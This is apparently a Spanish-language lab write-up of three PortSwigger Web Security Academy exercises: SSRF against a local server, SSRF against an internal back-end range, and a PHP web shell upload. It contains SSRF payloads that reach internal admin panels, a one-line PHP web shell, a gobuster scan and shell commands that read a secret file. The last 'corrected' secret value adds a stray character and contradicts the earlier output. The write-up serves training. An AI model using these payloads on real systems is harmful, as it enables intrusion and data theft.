# **Server-side vulnerabilities**

### Lab: Basic SSRF against the local server

**Decription**

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

Process

Accedemos a cualquier productor para revisar la función, interceptando la petición con Burpsuite:

```bash
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D3%26storeId%3D1

Decode

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=3&storeId=1
```

Vamos a probar a acceder al panel, mediante el localhost, usando la petición


```bash
stockApi=http://localhost/admin
```

Vemos que nos carga el panel de Admin

Obserbamos el codigo y vemos el parametro para eliminar al usuario Carlos es: 

```bash
https://0a5b00400452e3b480b62675000700a8.web-security-academy.net/admin/delete?username=carlos
```

Usamos esta petición, desde la función de control de Stock y usando la dirección del localhost:

```bash
stockApi=http://localhost/admin/delete?username=carlos
```

Con esto, nos devuelve que el usuario ha sido eliminado y el laboratorio superado.
### Lab: Basic SSRF against another back-end system

**Description:**

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port `8080`, then use it to delete the user `carlos`

**Process**:

Accedemos a cualquier productor para revisar la función, interceptando la petición con Burpsuite:

```bash
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1

Decoded:

stockApi=http://192.168.0.1:8080/product/stock/check?productId=2&storeId=1
```

Vemos que apunta a 192.168.0.1:8080
Tal como nos indican en el laboratorio, tenemos que encontrar en que rango se encuentra el portal Admin. Para ello usaremos en el Intruder de Burpsuite, un ataque "Snipper" para ver que dirección nos da una respuesta válida. 

Usamos como Payload una lista de numeros, secuenciales del 1 al 255

```bash 
stockApi=http://192.168.0.$$:8080/admin
```

El resultado que nos da un 200 (respuesta OK) es el 251
Por lo tanto, podemos acceder al portal de admin mediante la función de control de stock en : 

```bash
stockApi=http://192.168.0.251:8080/admin
```

Si examinamos el código o vemos la petición, observamos que el parametro para eliminar el usuario Carlos es: 

```bash
delete?username=carlos
```

Mandamos entonces la petición siguiente, desde el control de Stocks:

```bash 
stockApi=http://192.168.0.251:8080/admin/delete?username=carlos
```

Con esto, queda finalizado el laboratorio.


### Lab: Remote code execution via web shell upload

**Description**

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

**Process**

Vemos que, desde la cuenta que nos dan, podemos subir una imagen para el avatar
Subimos un archivo php con una webshell

```php 
<?php echo system($_GET['cmd']); ?>
```

Nos indican que se ha subido correctamente el archivo con el siguiente mensaje:

*"The file avatars/webshell.php has been uploaded"*

Si mantenemos el proxy capturando, vemos que hay una solicitud GET hacia : 

```php
GET /files/avatars/webshell.php HTTP/2
```

Si mandamos al Repeater y modificamos la petición para mandar: 

```php
GET /files/avatars/webshell.php?cmd=cat%20/home/carlos/secret 

# Obtenemos

Hm0Ft2cUcTRZJTr9Tx54l6LSWlqGoazN

```

NOTA: En el sitemap de Burpsuite, aparece la ubicación donde subimos el archivo (/files/avatars)

METODO 2: 

Para saber en que ubicación se guarda el archivo, hacemos fuzzing a la web en busca de directorios potenciales:

```bash
gobuster dir -u https://0af300b7048f86bd81fb39b0000d006b.web-security-academy.net/  -w /usr/share/seclists/Discovery/Web-Content/common.txt -r -x php

Starting gobuster in directory enumeration mode
===============================================================
/Login                (Status: 200) [Size: 3422]
/analytics            (Status: 200) [Size: 0]
/favicon.ico          (Status: 200) [Size: 15406]
/files                (Status: 403) [Size: 277]
/login                (Status: 200) [Size: 3422]
/logout               (Status: 200) [Size: 8460]
/my-account           (Status: 200) [Size: 3422]
/post                 (Status: 400) [Size: 27]
Progress: 9500 / 9500 (100.00%)
```

Probamos con el directorio /files

```bash 
https://0af300b7048f86bd81fb39b0000d006b.web-security-academy.net/files/avatars/webshell.php?cmd=id

uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

Vemos que el sistema nos devuelve el comando, por lo que ahora, vamos a probar a leer el fichero /home/carlos/secret

```bash
https://0af300b7048f86bd81fb39b0000d006b.web-security-academy.net/files/avatars/webshell.php?cmd=cat /home/carlos/secret

Hm0Ft2cUcTRZJTr9Tx54l6LSWlqGoazNHm0Ft2cUcTRZJTr9Tx54l6LSWlqGoazN

NOTA: Aparece duplicado, el codigo seria:

Hm0Ft2cUcTRZJTr9Tx54l6LSWlqGoazNH
```

Facilitamos el contenido del fichero y solucionamos el laboratorio.




